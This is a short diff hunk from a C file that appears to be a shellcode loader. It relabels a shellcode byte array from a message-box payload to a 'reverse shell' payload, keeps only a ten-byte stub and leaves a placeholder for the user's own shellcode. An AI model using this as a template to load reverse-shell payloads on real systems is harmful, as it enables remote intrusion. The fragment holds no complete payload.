@@ -5,7 +5,7 @@
 
 #pragma comment(lib, "advapi32.lib")
 
-/*------[MESSAGEBOX SHELLCODE AND ITS LENGTH]------*/
+/*------[REVERSE SHELL SHELLCODE AND ITS LENGTH]------*/
 unsigned char shellcode[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00";
 // You shellcode here: 
